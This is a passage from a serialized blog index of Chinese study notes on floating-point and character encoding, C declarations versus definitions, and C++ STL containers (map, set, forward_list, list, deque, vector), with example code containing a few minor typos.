数据的运算指令集中涉及到的运算涉及到的定点运算：带符号整数（取负、符号扩展、加、减、乘、除、算术移位）、无符号整数（0扩展、加、减、乘、除、逻辑移位）、逻辑操作（与、或、非）涉及到的浮点数运算：加、减、乘、除","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"浮点数的表示","slug":"2017-05-05-浮点数的表示","date":"2017-05-04T16:00:00.000Z","updated":"2018-02-18T03:29:06.406Z","comments":true,"path":"2017/05/05/2017-05-05-浮点数的表示/","link":"","permalink":"http://coordinate.wang/2017/05/05/2017-05-05-浮点数的表示/","excerpt":"","text":"第0位符号S；第1-8位为8位移码表示阶码E；第9-31位为24位二进制原码小数表示的尾数M。规格化尾数的小数点后第一位是1，故规定的第一位默认的“1”不明显表示出来。这样可用23个数位表示24位尾数。移码 定点整数，用来表示浮点数的阶，移码和补码差别仅仅是符号位差别相反。也可以这样计算 偏致常数+目标数=移码最大正数：$$0.11…1 2^{(11…1)}= (1 - 2^{(-24)}) 2^{127}$$最小正数：$$0.10…0 2^{(00…0)} = (1/2) 2^{(-128)}$$机器0：尾数为0或落在下溢区中的数浮点数范围比定点数大，但数的个数没有变多，数之间更稀疏，不均匀。为了表示更多的有效数字，通常规定规格化数的小数点前为1。在IEEE 754标准中Sign bit：1表示negative；0表示positiveExponent（阶码）：SP规格化阶码范围为0000 0001（-126）~1111 1110（127）（全0或全1表示特殊值）Bias为127（single），1023（double）要注意的是双精度数的Exponent是11位，Significand为52位SP:$$ (-1)^S (1 + Significand) 2^{(Exponent-127)}$$DP: $$(-1)^S (1 + Significand) 2^{(Exponent-1023)}$$ How to represent 0?Exponent: all zerosSignificand: all zerosWhat about sign? Both cases calid.浮点数除0的结果是+/-∞，而不是溢出异常（整数除0异常）这样做的原因是：可以利用+∞/-∞作比较。 How to represent +∞/-∞?Exponent: all onesSignificand: all zeros相关操作：5.0 / 0 = +∞ “非数”的表示Sqrt(-4.0) = ? 0/0 = ?称为Not a Number(NaN) – “非数”How to represent NaN?Exponent = 255Significand：nonzeroNaNs可以帮助调试程序相关操作：sqrt(-4.0) = NaN 非规格化数Exponent: all onesSignificand: nonzero并且它的首位数字不再是1而是0 非数值数据的编码逻辑数据的编码表示计算机中何时会用到逻辑及数据？用一位表示，N位二进制可表示N个逻辑数据，运算时按位进行，逻辑数据和数值数据在形式上并无差异，也是一串0/1序列，计算机靠指令来识别。 西文字符的编码表示特点：只是一种拼音文字，用有限的几个字母拼写出所有的单词。只需要对有限的字母和数学符号、标点符号等辅助字符编码。所有的字符总数不超过256，使用7或8个二进制可表示。表示：常用7位ASCII码表示操作：字符串操作 汉字及国际字符的编码汉字特点：汉字是一种图形文字，汉字数据量非常大编码形式：输入码：对汉字用相应按键进行编码表示，用于输入内码：用于系统中进行存储、查找、传送等处理字模点阵或轮廓描述：描述汉字字模点阵或轮廓，用于显示/打印西文字符没有输入码，内码就是ASCII，有字模点阵至少需要两个字节才可以表示汉字内码，有汉字的总数（超过6万字）决定。可在GB2312国标码的基础上产生汉字内码为了与ASCII区别，将国标码的两个字节的第一位置“1”后得到一种汉字内码。例如汉字“大”在码表中位于20行，83列。因此区位码为0010100 1010011，在区位码上加32得到两个字节的编码，即00110100 01110011=3473H。前面的34H和字符“4”的ASCII码相同，后面的73H和字符“S”的ASCII码相同，但是，将每个字节的最高位各设为“1”后，就得到其内码：10110100 11110011=B4F3H，因此不会和ASCII码混淆。","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"数据的宽度和存储容量的单位","slug":"2017-05-04-数据的宽度和存储容量的单位","date":"2017-05-03T16:00:00.000Z","updated":"2018-02-18T03:29:06.384Z","comments":true,"path":"2017/05/04/2017-05-04-数据的宽度和存储容量的单位/","link":"","permalink":"http://coordinate.wang/2017/05/04/2017-05-04-数据的宽度和存储容量的单位/","excerpt":"","text":"数据的基本宽度比特是计算机中处理、存储、传输信息的最小单位二进制信息最基本的单位是 “字节”，现代计算机中，存储器按字节编址，字节是最小的寻址单位。如果以字节为一个排列单位，则LSB表示最低有效字节，MSB表示最高有效字节除位和字节外，还经常用“字”作为单位。字与字长的概念不同，IA-32中的字是16位，表示被处理信息的单位，用来度量数据类型的宽度。而字长是32位，指定点数据通路的宽度，等于CPU内的总线宽度、运算器的位数、通用寄存器的宽度。例如：对于x86架构，不管字长多少，定义字的宽度都为16位，而从386开始字长就是32位了。 数据的存储和排列顺序变量的地址是其最小地址。例如：若int x = -110;，x的存放地址是100，即x存放在100#~103#多个字节在存储单元中存储方式分为大端方式和小端方式，在intel中是按小端方式存放数据的，也就是数据的最高位存放在地址的最低位。Union的存放顺序是所有成员从低地址开始，利用该特性可测试CPU的大/小端方式。 12345678910111213141516171819#include&lt;stdio.h&gt;void main()&#123; union NUM &#123; int a; char b; &#125; num; num.a = 0x1234567; if(num.b == 0x12) &#123; printf(\"Big Endian\\n\"); &#125; else &#123; printf(\"Little Endian\\n\"); &#125; printf(\"num.b = 0x%X\\n\", num.b);&#125; 假定小端方式机器中某条指令的地址为1000该指令的汇编形式为：mov AX, 0x12345(BX)其中操作码 mov 为40H，寄存器AX和BX的编号分别为0001B和0010B。立即数占32位，则存放顺序为：401245230100 小端方式401200012345 大端方式","categories":[{"name":"计算机系统原理","slug":"计算机系统原理","permalink":"http://coordinate.wang/categories/计算机系统原理/"}],"tags":[{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"原理","slug":"原理","permalink":"http://coordinate.wang/tags/原理/"}]},{"title":"声明与定义","slug":"2017-04-30-声明与定义","date":"2017-04-29T16:00:00.000Z","updated":"2018-02-18T03:29:06.368Z","comments":true,"path":"2017/04/30/2017-04-30-声明与定义/","link":"","permalink":"http://coordinate.wang/2017/04/30/2017-04-30-声明与定义/","excerpt":"","text":"转自小鱼的学习笔记 变量的定义、声明变量的声明有两种情况：一种是需要建立存储空间的。例如：int a。在声明的时候就已经建立了存储空间。这种声明是”定义性声明(defining declaration)”，即我们平时所说的“定义”。另一种是不需要建立存储空间的，只是告诉编译器某变量已经在别处定义过了。例如：extern int a。其中，变量a是在别处定义的。这种声明是”引用性声明(referncing declaration)”，即我们平时所说的“声明”。 从广义的角度来讲，声明中包含着定义，但是并非所有的声明都是定义。即，定义性声明既是定义又是声明，而引用性声明只是声明。例如：int a。它既是声明，同时又是定义。然而对于 extern int a 来讲，它只是声明不是定义。 一般的情况下我们常常这样叙述，把建立空间的声明称之为”定义”，而把不需要建立存储空间的称之为”声明”。很明显这里指的声明是范围比较窄的，也就是说引用性的声明。 例子： 123int a; //定义性声明，分配存储空间，初值default为0int b = 0; //定义性声明，分配存储空间，赋初值extern int c; //引用性声明，不分配存储空间，只是告诉编译器这个变量已经在别处定义过了 函数的定义、声明函数的定义和声明也是一样，定义需要分配存储空间；声明只是告诉编译器这个函数已经在别处定义过了。函数的定义和声明比较好区分。有函数体的即为定义，不带函数体即为声明。 例子： 12345678//声明double sqrt(double x); //定义double sqrt(double x)&#123; return x*x;&#125; 在C语言中，如果在定义和声明一个函数之前直接使用的话，它的返回值默认类型是整形 定义与声明的区别 是否需要分配存储空间。 在一个作用域中可以重复声明，但不能重复定义。这是由（1）决定的，可以重复几次告诉编译器某个变量、函数已经在别处定义了，但不能重复多次地让编译器为同一个变量、函数分配不同的存储空间。 关于extern要注意的一点extern 只是用来声明全局变量，在一个文件中声明全局变量，声明方法可以如下两种（都一样）： 12extern int a;//第一种int a;//第二种 也就是在一个文件中声明全局变量，extern可以省略；如果在一个文件中声明了一个全局变量(extern)int a，要想在另一个文件中使用这个变量，则要在另一个文件前面加上全局变量声明，即加上：extern int a;（extern 不可省略）这样两个文件的全局变量a就是同一个，它的值就可以互相使用了，也可以在任意文件中改变了。还要注意的是第二种做法在C语言中，如果一个变量在多个源文件中定义却没有指定初始值，在某些系统中是接受的，在c++中不允许。有几个问题我也不知道为什么，例如在函数中声明一个字符变量，可以将这个字符变量打印出来结果是’?’，但是别的变量类型没法打印，报错是”没有对变量赋值”，这里记录这个问题，以后解决。 转自剑圣风暴 实际情况下一个比较好的处理方式在实际的编程中，全局变量对我们编程来说既是喜又是泪，虽然说项目中尽量避免使用全局变量，但总有些时候不得不使用它，并且可能使用得不少，各个模块可能有含有或多或少的几个全局变量，而当别的模块需要引用的时候，就必须extern它，造成你定义了一遍又声明了一遍，这样就稍显得麻烦。下面介绍一种全局变量的管理方法，至始至终只定义一次，所有的全局变量以某种声明方式放入一个名叫global.h的头文件中，然后别的模块include它就OK。那么如何操作呢？这里还要新建一个同名的global.c源文件，用来定义所有全局变量，注意这里并不是手工一个一个定义，而是采用预处理方式，废话少说见下面程序 global.h 12345678910111213#ifndef _GLOBAL_H#define _GLOBAL_H#ifdef GLOBAL_VAR #define GLOBAL_EXTERN #else #define GLOBAL_EXTERN extern #endif GLOBAL_EXTERN int g_var1; GLOBAL_EXTERN int g_var2;#endif global.c 123#define GLOBAL_VAR #include \"global.h\" #undef GLOBAL_VAR","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"c","slug":"c","permalink":"http://coordinate.wang/tags/c/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"}]},{"title":"STL容器（7）Map和Mutimap","slug":"2017-04-29-STL容器7Map和Mutimap","date":"2017-04-28T16:00:00.000Z","updated":"2018-02-18T03:29:06.368Z","comments":true,"path":"2017/04/29/2017-04-29-STL容器7Map和Mutimap/","link":"","permalink":"http://coordinate.wang/2017/04/29/2017-04-29-STL容器7Map和Mutimap/","excerpt":"","text":"定义于头文件 123456template&lt; class Key, class T, class Compare = std::less&lt;Key&gt;,class Allocator = std::allocator&lt;std::pair&lt;const Key, T&gt; &gt;&gt; class map; std::map是一个有序关联容器，包含具有唯一键的键值对。键使用比较函数Compare比较来进行排序。搜索，删除和插入操作具有对数复杂性。map通常实现为红黑树。 123456template&lt; class Key, class T, class Compare = std::less&lt;Key&gt;,class Allocator = std::allocator&lt;std::pair&lt;const Key, T&gt; &gt;&gt; class multimap; multimap是一个关联容器，它包含一个有序的键值对列表。键值按照Compare比较函数来排序。搜索、插入和删除操作具有对数的复杂性。 相等的键值对在比较中的排序是保持插入时的顺序。 (C++11 起) Map和Multimap的能力Map和multimap后根据元素的key自动对元素排序。这么一来，根据已知的key查找某个元素时就能够有很好的效率，而根据已知value查找元素时，效率就会很糟糕。map和multimap身上有一个重要的限制：你不可以直接改变元素的key，因为这会破坏正确顺序。要修改元素的key，必须先移除该key的元素，然后插入key/value的元素。 Map和Multimap的操作函数成员函数find用来查找第一个“拥有某key”的元素，并返回一个迭代器指向该位置。如果没有这样的元素，就返回容器的end。你不能以find查找拥有某特定value的元素。你可以使用下面的方法查找value： 123456789std::multimap&lt;std::string,float&gt; coll;std::multimap&lt;std::string,float&gt;::iterator pos;for(pos = coll.begin(); pos != coll.end(); ++pos)&#123; if(pos-&gt;second == value) &#123; do_something(); &#125;&#125; 还可以使用find_if: 12345auto pos = find_if(coll.begin(),coll.end(), [](const pair&lt;float,float&gt;&amp; elem) &#123; return elem.second == value; &#125;); Map和multimap只支持“所有容器都提供的基本赋值操作”，赋值动作的两端容器必须拥有相同类型，尽管“比较准则”本身可能不同，但其类型必须相同。如果准则不同，准则本身也会随着容器被赋值或交换。但只要注意的是，元素比较函数只能用于类型相同的容器身上，换言之，两个容器的key、value、排序准则都必须相同的类型。如果你一定要修改元素的key，只有一条路：以一个“value相同”的新元素替换掉旧元素。 1234567891011121314151617181920212223namespace MyLib &#123; template &lt;typename Cont&gt; inline bool replace_key (Cont&amp; c, const typename Cont::key_type&amp; old_key, const typename Cont::key_type&amp; new_key) &#123; typename Cont::iterator pos; pos = c.find(old_key); if (pos != c.end()) &#123; // insert new element with value of old element c.insert(typename Cont::value_type(new_key, pos-&gt;second)); // remove old element c.erase(pos); return true; &#125; else &#123; // key not found return false; &#125; &#125;&#125; 但是map提供一个非常方便的手法，然你改变元素的key。 1234//insert new element with value of old elementcoll[\"new_key\"] = coll[\"old_key\"];//remove old keycoll.erase(\"old_key\"); 有三种方法可以将value传入map或multimap 运用value_type 12std::map&lt;std::string,float&gt; coll;coll.insert(std::map&lt;std::string,float&gt;::value_type(\"ot\",12)); 或 1coll.insert(decltype(coll)::value_type(\"oit\",12)); 运用pair&lt;&gt; 123std::map&lt;std::string,float&gt; coll;coll.insert(std::pair&lt;std::string,float&gt;(\"ot\",12));coll.insert(std::pair&lt;const std::string,float&gt;(\"ot\",12)); 运用make_pair，这是C++11前最方便的做法 12std::map&lt;std::string,float&gt; coll;coll.insert(std::make_pair (\"ot\",12)); 查看是否插入成功，可以使用和set和multiset相同的方法，也就是coll.insert().second。使用emplace函数与insert的区别在于：The element is constructed in-place by calling allocator_traits::construct with args forwarded.A similar member function exists, insert, which either copies or moves existing objects into the container.移除元素时，当心发生意外情况。移除迭代器所指对象时，有一个很大的危险。 12345678std::map&lt;std::string,float&gt; coll;for(auto pos = coll.begin();pos != coll.end(); ++pos)&#123; if(pos-&gt;second == value) &#123; coll.earse(pos);//RUNTIME ERROR &#125;&#125; 对pos所指元素erase，会使pos不再成为coll的一个有效迭代器。所以后面++pos，这样做是不合理的。C++11后的做法很简单，earse总是返回一个迭代器所指元素其后继元素： 123456789101112std::map&lt;std::string,float&gt; coll;for(auto pos = coll.begin();pos != coll.end();)&#123; if(pos-&gt;second == value) &#123; coll.earse(pos); &#125; else &#123; ++pos; &#125;&#125; 而在C++11之前的做法是： 1234567891011for(auto pos = coll.begin();pos != coll.end();)&#123; if(pos-&gt;second == value) &#123; coll.earse(pos++); &#125; else &#123; ++pos; &#125;&#125; 关联式数组的优点是你可以通过更方便的接口对map安插新元素。例如： 1coll[\"fdsa\"] = 12; 对于coll[“fdsa”]的处理：如果存在key为“fdsa”的元素，上式会返回元素的reference。如果没有任何元素的key是“fdsa”，便为map插入一个新元素，令其key为“fdsa”，value以default构造函数完成，并返回一个reference指向新元素。但是上面的这种做法是会存在缺点的，你很容易想到如果这样做的话： 1std::cout &lt;&lt; coll[\"fdsaa\"]; 这和我预先的做法就有出入，它的结果是输出0。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"STL容器（6）Set和Multiset","slug":"2017-04-28-STL容器6Set和Multiset","date":"2017-04-27T16:00:00.000Z","updated":"2018-02-18T03:29:06.352Z","comments":true,"path":"2017/04/28/2017-04-28-STL容器6Set和Multiset/","link":"","permalink":"http://coordinate.wang/2017/04/28/2017-04-28-STL容器6Set和Multiset/","excerpt":"","text":"Set和Multiset定义于头文件 12345template&lt; class Key, class Compare = std::less&lt;Key&gt;,class Allocator = std::allocator&lt;Key&gt;&gt; class set; std::set是一个关联容器，是一个有序的集合，集合中包含不可重复的、类型为Key的元素。排序通过使用类型为Compare的比较函数比较来实现。搜索，删除和插入操作具有对数时间复杂度。set通常实现为红黑树。 12345template&lt; class Key, class Compare = std::less&lt;Key&gt;,class Allocator = std::allocator&lt;Key&gt;&gt; class multiset; multiset 是一个关联容器，它包含一些有序的Key类型的对象。与set不同的是，它允许多个带有相同值的键存在。排序通过使用键比较函数比较来实现。搜索，插入和删除操作具有对数的复杂性.在比较中相等的元素，顺序为插入时的顺序，且不会改变。 (C++11 起) Set和Multiset的能力自动排序会造成set和multiset的一个重要限制：你不能直接改变元素值，因为这样会打乱原本正确的顺序。因此，要改变元素值，必须先删除旧元素，在插入新元素。一下接口反映这种行为：Set和multiset不提供任何操作函数可以直接访问元素。从迭代器的角度看，元素只是一个常量。 Set和Multiset的操作函数排序准则也被用来检查元素的相等性。采用默认排序准则时，两元素的相等性检查如下： 1if(!(elem1 &lt; elem2)||（elem2 &lt; elem1)) 这种做法有三种好处： 只需传递一个实参作为排序准则 不必针对元素类型提供operator== 可以对“相等性”有相反的定义。元素比较只适用于类型相同的容器。换而言之，元素和排序准则则必须有相同的类型，否则编译器会报错。 1234std::set&lt;float&gt; c;std::set&lt;float,std::greater&lt;float&gt;&gt; c2;if(c == c2)//ERROR different types&#123;&#125; lower_bound和upper_bound分别返回第一个和最后一个“元素可安插点”。换而言之，lower_bound返回第一个“大于等于实参值”的元素位置，upper_bound返回第一个“大于实参值”的位置。equal_range则是将lower_bound和upper_bound的返回值做成一个pair返回，所以他返回的是“与实参值相等”的元素所形成的区间。和所有关联式容器类似，这里迭代器是双向迭代器。所以，对于那些“只能接受随机访问迭代器”的STL算法。更重要的是，从迭代器的角度看，所有元素都被视为常量。这使得你无法对set或multiset调用更易性算法。例如你不能对它们调用remove，因为remove算法实际上是以其实参值覆盖被移除的元素。注意，用于安插元素的函数：insert和emplace，其返回值不尽相同：返回类型之所以不相同，原因是：multiset允许元素重复而set不允许。因此，如果将某元素安插至set内，而该set内含同值元素，安插失败。所以set的返回类型是以pair组织起来的两个值： pair结构中的second成员表示安插是否成功。 pair结构中first成员表示新元素的位置，或现存的同元素位置。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"STL容器（5）forward_list","slug":"2017-04-26-STL容器5forward_list","date":"2017-04-25T16:00:00.000Z","updated":"2018-02-18T03:29:06.337Z","comments":true,"path":"2017/04/26/2017-04-26-STL容器5forward_list/","link":"","permalink":"http://coordinate.wang/2017/04/26/2017-04-26-STL容器5forward_list/","excerpt":"","text":"Forward list定义于头文件 &lt;forward_list&gt; 1234template&lt; class T,class Allocator = std::allocator&lt;T&gt;&gt; class forward_list; (C++11 起)单向列表是一个容器，支持在其任何地方快速插入和删除元素，不支持快速的随机访问。它被实现为单向链表，和C中它的实现相比，基本上不会有任何开销。当不需要双向迭代的时候，与std::list相比，该容器具有更高的空间利用率。 Forward list的能力相较于list，forward list有以下约束： forward list只提供前向迭代器，而不是双向迭代器。因此它不支持反向迭代器，这意味着reverse_iterator不再提供。 forward list不提供size函数。 forward list没有这项最末元素的锚点。基于这个原因，forward list不提供back、push_back和pop_back函数 对于所有“令元素被安插或删除与forward list的某特定位置上”的成员函数，forward list提供特殊版本。原因是你必须传递第一个被处理元素的前一个位置，因为你必须在哪里指定一个新的后继元素，然而由于froward list不允许回头，因此对于这些成员函数，你必须传递迁移元素位置。 Forward list的操作Forward list不提供size，原因是他不存储元素的数量，亦无法在常量时间内算出它。此外也为了凸显size是一个费时操作，所以不提供它。如果你必须计算元素个数，可以使用distance 函数： 12std::forward_list&lt;int&gt; l;std::cout &lt;&lt; \"l.size()\" &lt;&lt; std::distance(l.begin(), l.end()) &lt;&lt; std::endl; forward list只提供了front函数用于元素访问。注意，面对forward list提供的所有安插、安放、抹除成员函数，你会有个疑问：他们需要获取一个元素位置，而你打算在这个位置上安插元素或删除元素。但这就必需改动前导元素，因为必须更改前导元素的pointer。但是对于forward list你无法回头，因此成员函数的行为就会和list不同。所有以after为结尾的函数，会将新元素安插于给定元素之后。当你使用成员函数，并使用begin_before，一个典型的例子如下： 123std::forward_list&lt;int&gt; fwlist = &#123;1,2,3&#125;;fwlist.insert_after(fwlist.before_begin(), &#123; 3,4,5&#125;); 要注意的是，调用after成员函数并传入end或cend函数将导致不明确的行为，因为如果要在forward list的尾端附加一个新元素，你必须传入终端元素的位置： 1fwlist.insert_after(fwlist.end(),1);// RUNTIME ERROR 再插入元素时，要注意的是由于使用的是一个单向链表，所以你只可以不断的向前，但是当你尝试找出某个元素，准备在那安插或删除元素时，“找到的当下”代表“已经超出了”，因为，想要在这个位置安插或删除元素，你必须改写给出的前一元素。这里又有这样几种做法，一是可以通过记录前一位置，不断++操作，另一种是使用next函数。 1234567891011auto posBefore = list.before_begin();for(; next(posBefore) != list.end(); ++posBefore)&#123; if( *next(posBefore) != list.end9); ++posBefore) &#123; if(*next(posBefore) %2 == 0) &#123; break; &#125; &#125;&#125; 注意这里我们要理解一个概念。begin指向的是第一个元素的位置，而before_begin指向的是第一个元素的前面位置，也就是真正意义上的首节点。你也可以自己定义算法，找出“拥有特定值”或“满足某特定条件”的元素的前一位置。 12345678910111213141516171819202122232425262728293031template &lt;typename InputIterator, typename Tp&gt;inline InputIteratorfind_before (InputIterator first, InputIterator last, const Tp&amp; val)&#123; if (first==last) &#123; return first; &#125; InputIterator next(first); ++next; while (next!=last &amp;&amp; !(*next==val)) &#123; ++next; ++first; &#125; return first;&#125;template &lt;typename InputIterator, typename Pred&gt;inline InputIteratorfind_before_if (InputIterator first, InputIterator last, Pred pred)&#123; if (first==last) &#123; return first; &#125; InputIterator next(first); ++next; while (next!=last &amp;&amp; !pred(*next)) &#123; ++next; ++first; &#125; return first;&#125; 注意，结合操作的来源端和目的端可以相同。因此你可以在同一个forward list中splice operation。但是要注意的是，调用splice_after 并传入end会导致不明确的行为 123fwlist.splice_after(fwlist.end(), fwlist, fwlist.begin());//RUNTIME ERROR","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"STL容器（4）list","slug":"2017-04-25-STL容器4list","date":"2017-04-24T16:00:00.000Z","updated":"2018-02-18T03:29:06.337Z","comments":true,"path":"2017/04/25/2017-04-25-STL容器4list/","link":"","permalink":"http://coordinate.wang/2017/04/25/2017-04-25-STL容器4list/","excerpt":"","text":"list定义于头文件 1234template&lt; class T,class Allocator = std::allocator&lt;T&gt;&gt; class list; 列表是一个容器，它支持任何位置的元素快速插入和删除，不支持快速的随机访问。它被实现为双向的链表。与std::forward_list相比，它提供双向迭代的能力，但具有更低的空间效率。 List的能力List在几个方面与array、vector或deque不同： list不支持随机访问。 任何位置上的元素的安插和删除都非常快，始终都是常量时间内完成，实际内部只进行一些pointer操作。 安插和删除元素不会造成其他元素的各个pointer、reference和iterator失效。 list的异常处理，要么操作成功，要么什么都不会发生 list提供的成员函数反映出它和array、vector以及deque不同： list提供front、push_front和pop_front、back、push_back和pop_back等。 由于不支持随机访问迭代器，list不提供subscript操作，也不提供at list并没有提供容量、空间重新分配函数。 list提供不少特殊成员函数。 List的操作为了移除元素list特别配备了remove算法的特别版本。这些成员函数比remove算法的速度快，因为它内部都是pointer操作。 12std::list&lt;Elem&gt; coll;coll.remove(val); 你可以使用remove_if并定义出元素的移除准则。例如： 123coll.remove_if([](int i)&#123; return i%2==0; &#125;); Linked list的最大一个好处是不论在任何位置，元素的安插和移除都只需要常量时间。 List的运用实例1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;list&gt;#include &lt;iostream&gt;#include &lt;algorithm&gt;#include &lt;iterator&gt;using namespace std;void printLists (const list&lt;int&gt;&amp; l1, const list&lt;int&gt;&amp; l2)&#123; cout &lt;&lt; \"list1: \"; copy (l1.cbegin(), l1.cend(), ostream_iterator&lt;int&gt;(cout,\" \")); cout &lt;&lt; endl &lt;&lt; \"list2: \"; copy (l2.cbegin(), l2.cend(), ostream_iterator&lt;int&gt;(cout,\" \")); cout &lt;&lt; endl &lt;&lt; endl;&#125;int main()&#123; // create two empty lists list&lt;int&gt; list1, list2; // fill both lists with elements for (int i=0; i&lt;6; ++i) &#123; list1.push_back(i); list2.push_front(i); &#125; printLists(list1, list2); // insert all elements of list1 before the first element with value 3 of list2 // - find() returns an iterator to the first element with value 3 list2.splice(find(list2.begin(),list2.end(), // destination position 3), list1); // source list printLists(list1, list2); // move first element of list2 to the end list2.splice(list2.end(), // destination position list2, // source list list2.begin()); // source position printLists(list1, list2); // sort second list, assign to list1 and remove duplicates list2.sort(); list1 = list2; list2.unique(); printLists(list1, list2); // merge both sorted lists into the first list list1.merge(list2); printLists(list1, list2);&#125; 结果为： 1234567891011121314list1: 0 1 2 3 4 5list2: 5 4 3 2 1 0list1:list2: 5 4 0 1 2 3 4 5 3 2 1 0list1:list2: 4 0 1 2 3 4 5 3 2 1 0 5list1: 0 0 1 1 2 2 3 3 4 4 5 5list2: 0 1 2 3 4 5list1: 0 0 0 1 1 1 2 2 2 3 3 3 4 4 4 5 5 5list2:","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"STL容器（3）deque","slug":"2017-04-24-STL容器3deque","date":"2017-04-23T16:00:00.000Z","updated":"2018-02-18T03:29:06.321Z","comments":true,"path":"2017/04/24/2017-04-24-STL容器3deque/","link":"","permalink":"http://coordinate.wang/2017/04/24/2017-04-24-STL容器3deque/","excerpt":"","text":"Deque定义于头文件 1234template&lt; class T,class Allocator = std::allocator&lt;T&gt;&gt; class deque; Deque的能力Deque与vector相比，功能上的差异如下： 两端都可以快速插入和删除元素，而vector只可以后端。 返回元素时deque内部结构会多一个间接过程，所有元素访问和迭代器的动作会慢一些。 迭代器需要在不同的区块间跳转，所以必须是一个smart pointer 在内存区块有限制的系统中，deque可以包含更多元素。 安插和删除元素都将导致指向deque元素的pointer、reference和iterator实效。不过deque的内存分配优于vector，因为其内部结构显示，deque不必在内存充分配时复制所有元素。 deque会释放不再使用的内存区块。deque的内存大小是可以缩减的。 以下情形最好使用deque： 你需要在两端安插或移除元素。 无需指向容器内的元素。 要求不再使用的元素必须释放。 Deque的操作函数Deque的各项操作只有两点和vector不同： deque不提供容量操作（capacity和reserve） deque提供函数完成头部元素的安插和删除 Deque运用实例1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include &lt;deque&gt;#include &lt;string&gt;#include &lt;algorithm&gt;#include &lt;iterator&gt;using namespace std;int main()&#123; // create empty deque of strings deque&lt;string&gt; coll; // insert several elements coll.assign (3, string(\"string\")); coll.push_back (\"last string\"); coll.push_front (\"first string\"); // print elements separated by newlines copy (coll.cbegin(), coll.cend(), ostream_iterator&lt;string&gt;(cout,\"\\n\")); cout &lt;&lt; endl; // remove first and last element coll.pop_front(); coll.pop_back(); // insert \"another\" into every element but the first for (unsigned i=1; i&lt;coll.size(); ++i) &#123; coll[i] = \"another \" + coll[i]; &#125; // change size to four elements coll.resize (4, \"resized string\"); // print elements separated by newlines copy (coll.cbegin(), coll.cend(), ostream_iterator&lt;string&gt;(cout,\"\\n\"));&#125; 结果是： 12345678910first stringstringstringstringlast stringstringanother stringanother string resized string","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"notes","slug":"notes","permalink":"http://coordinate.wang/tags/notes/"},{"name":"cpp标准库","slug":"cpp标准库","permalink":"http://coordinate.wang/tags/cpp标准库/"}]},{"title":"STL容器（2）vector","slug":"2017-04-23-STL容器2vector","date":"2017-04-22T16:00:00.000Z","updated":"2018-02-18T03:29:06.321Z","comments":true,"path":"2017/04/23/2017-04-23-STL容器2vector/","link":"","permalink":"http://coordinate.wang/2017/04/23/2017-04-23-STL容器2vector/","excerpt":"","text":"Vector定义于头文件\\&lt;vector> 1234template&lt; class T,class Allocator = std::allocator&lt;T&gt;&gt; class vector; Vector的能力Vector支持随机访问，因此只要知道位置，就可以在常亮时间内访问任意元素。vector提供随机访问迭代器，所以适用于任意STL算法。capacity函数返回vector实际容纳量，如果超过这个量，vector必须重新分配内部内存。一旦内存重新分配，vector元素相关的所有reference、pointer和iterator都会失效，内存重新分配很耗时间。你可以使用reserve函数保存适当容量，避免重新分配： 12std::vector&lt;int&gt; v;v.reserve(80);//reserve mempry for 80 elements vector不能使用reserve缩减容量，调用reverse所给的实参如果小于当前vector的容量，不会引发任何效果。，既然vector的容量不会缩减，我们就可以知道，及时删除元素，其reference、pointer和iterator也会继续有效，继续指向动作发生前的位置。然而安插动作可能会使reference、pointer和iterator实效，因为会使vector重排。C++11引入一个新的函数shrink_to_fit：这个函数不具有强制力的要求，可以缩减容量以符合当前的元素个数。 1v.shrink_to_fit();//注意不具有强制性 在c++11之前有一个小技巧实现这个功能。 123456template&lt;typename T&gt;void shrinkCapacity(std::vector&lt;T&gt;&amp; v)&#123; std::vector&lt;T&gt; tmp(v); v.swap(tmp);&#125; 你甚至可以像这样使用： 1std::vector&lt;T&gt;(v).swap(v); 但是要注意的是，这些做法都会使reference、pointer和iterator换了只想对象。 Vector的操作元素访问at 访问指定的元素，同时进行越界检查operator[] 访问指定的元素front 访问第一个元素back 访问最后一个元素data 返回指向内存中数组第一个元素的指针当pop_back调用时，确保容器不为空是程序员的责任。例如： 